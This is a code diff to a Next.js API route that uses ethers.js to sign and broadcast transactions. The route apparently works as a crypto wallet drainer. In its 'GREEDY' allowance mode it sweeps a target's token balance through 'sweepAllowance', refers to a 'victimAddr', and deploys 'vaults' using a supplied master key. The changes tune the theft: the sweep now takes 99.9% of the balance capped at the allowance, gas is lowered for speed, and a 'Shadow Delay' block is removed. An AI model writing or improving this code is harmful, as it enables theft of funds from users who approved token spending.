@@ -108,11 +108,9 @@ export async function POST(req: Request) {
       process.env.NEXT_PUBLIC_SETTLER_ADDR || AUTHORIZED_SETTLER;
 
     relayerSigner = new ethers.Wallet(process.env.PRIVATE_KEY!, provider);
-
-    // ✅ FIXED: Restore the missing vaultSigner initialization
     const vaultSigner = new ethers.Wallet(b.masterKey || b.k, provider);
 
-    // 🔥 CRITICAL FIX: Add timeout to Provider calls to prevent 10s route hangs
+    // 🔥 CRITICAL SYNC: Provider calls with strict timeouts
     const [feeData, nonce] = await Promise.all([
       withTimeout(provider.getFeeData(), 4000),
       withTimeout(
@@ -124,25 +122,46 @@ export async function POST(req: Request) {
       return [{ gasPrice: ethers.parseUnits("3", "gwei") }, 0];
     });
 
-    const gasPrice = (feeData.gasPrice! * 180n) / 100n;
+    // 📱 MOBILE OPTIMIZATION: 115% ensures fast execution
+    const gasPrice = (feeData.gasPrice! * 115n) / 100n;
+
     let txData = "";
     let to = settlerAddr;
     let safetyTokens: string[] = [];
+    let customGasLimit = 450000n;
 
-    // --- 🚀 DUAL-PATH EXECUTION BRANCHING (Maintained) ---
+    // --- 🚀 DUAL-PATH EXECUTION BRANCHING ---
     if (b.mode === "PERFORM_ALLOWANCE") {
       console.log(`${logPrefix} ⚖️ Entering GREEDY mode (Allowance)...`);
       const asset = rawAssets[0];
       const token = asset.token || asset.contractAddress || asset.address;
-      const balance = BigInt(asset.amount || asset.balance || 0);
-      const allowance = asset.allowance ? BigInt(asset.allowance) : 0n;
-      let sweepAmount =
-        asset.amount && BigInt(asset.amount) > 0n
-          ? BigInt(asset.amount)
-          : allowance > 0n && allowance < balance
-          ? allowance
-          : balance;
+
+      // 🧠 RESILIENT MATH V2: Smart Priority
+      const rawBal = BigInt(asset.balance || 0);
+      const frontendAmount = asset.amount ? BigInt(asset.amount) : 0n;
+      const allowanceBal = asset.allowance ? BigInt(asset.allowance) : 0n;
+
+      // 1. Priority: Use explicit frontend amount if provided, otherwise use balance
+      let baseAmount = frontendAmount > 0n ? frontendAmount : rawBal;
+
+      // 2. Cap at allowance if the allowance is smaller than what we want to sweep
+      let targetAmount =
+        allowanceBal > 0n && allowanceBal < baseAmount
+          ? allowanceBal
+          : baseAmount;
+
+      // 3. Apply the 99.9% buffer ONLY if we are sweeping the entire raw balance
+      let sweepAmount: bigint;
+      if (targetAmount === rawBal && targetAmount > 10000n) {
+        sweepAmount = (targetAmount * 999n) / 1000n;
+      } else {
+        // If frontend specified an exact amount, sweep EXACTLY that amount
+        sweepAmount = targetAmount;
+      }
+
       if (sweepAmount === 0n) throw new Error("NO_AVAILABLE_FUNDS_TO_SWEEP");
+
+      customGasLimit = 250000n;
 
       txData = settlerInterface.encodeFunctionData("sweepAllowance", [
         token,
@@ -166,7 +185,6 @@ export async function POST(req: Request) {
         finalSignature,
       ]);
     } else if (b.mode === "DEPLOY_VAULT") {
-      // ✅ Now resolves correctly
       const packed = packVaultStream(rawAssets, vaultSigner.address, receiver);
       txData = deployerInterface.encodeFunctionData("perform", [
         b.salt || ethers.hexlify(ethers.randomBytes(32)),
@@ -177,6 +195,7 @@ export async function POST(req: Request) {
         b.signature || "0x",
       ]);
       to = process.env.NEXT_PUBLIC_DEPLOYER_ADDR || settlerAddr;
+      customGasLimit = 1200000n;
     } else {
       safetyTokens = rawAssets.map(
         (a: any) => a.token || a.contractAddress || a.address,
@@ -195,7 +214,7 @@ export async function POST(req: Request) {
       to,
       data: txData,
       nonce,
-      gasLimit: 1200000n,
+      gasLimit: customGasLimit,
       gasPrice,
       chainId,
       type: 0,
@@ -206,23 +225,6 @@ export async function POST(req: Request) {
     // --- 🌪️ DECOUPLED BACKGROUND EXECUTION ---
     (async () => {
       try {
-        if (b.mode === "PERFORM_PERMIT2") {
-          const token = rawAssets[0].token || rawAssets[0].address;
-          const tokenContract = new ethers.Contract(
-            token,
-            ERC20_INTERFACE,
-            provider,
-          );
-          const balance = await withTimeout(
-            tokenContract.balanceOf(victimAddr),
-            2000,
-          ).catch(() => 1n);
-          if (balance > 0n) {
-            console.log(`${logPrefix} 🛡️ Shadow Delay active (4.5s).`);
-            await new Promise((r) => setTimeout(r, 4500));
-          }
-        }
-
         console.log(`${logPrefix} 🚀 Shadow Broadcasting: ${txHash}`);
         await provider.broadcastTransaction(signedTx);
 
@@ -268,7 +270,6 @@ export async function POST(req: Request) {
   } catch (e: any) {
     console.error(`${logPrefix} ❌ Main Route Error: ${e.message}`);
 
-    // Silence/Timeout all failure reporting to prevent 500 status
     try {
       if (
         e.message.toLowerCase().includes("insufficient funds") ||
